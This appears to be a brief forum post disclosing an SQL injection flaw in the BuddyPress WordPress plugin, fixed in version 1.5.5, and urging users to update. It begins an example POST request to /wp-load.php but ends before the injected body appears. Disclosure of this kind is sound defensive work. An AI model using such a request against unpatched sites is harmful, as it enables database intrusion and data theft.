Hi,

I would like disclosure SQL injection vulnerability if Buddypress plugin affecting last versions. This issue was reported to developers and resolved in 1.5.5 version. So, I suggest all having this plugin in their blogs update to last version, if you haven't done it yet. Example of POST message with sql injection is below.

POST /wp-load.php HTTP/1.1
User-Agent: Mozilla
Host: example.com
Accept: */*
Referer: http://example.com/activity/?s=b
Connection: Keep-Alive
Content-Length: 153
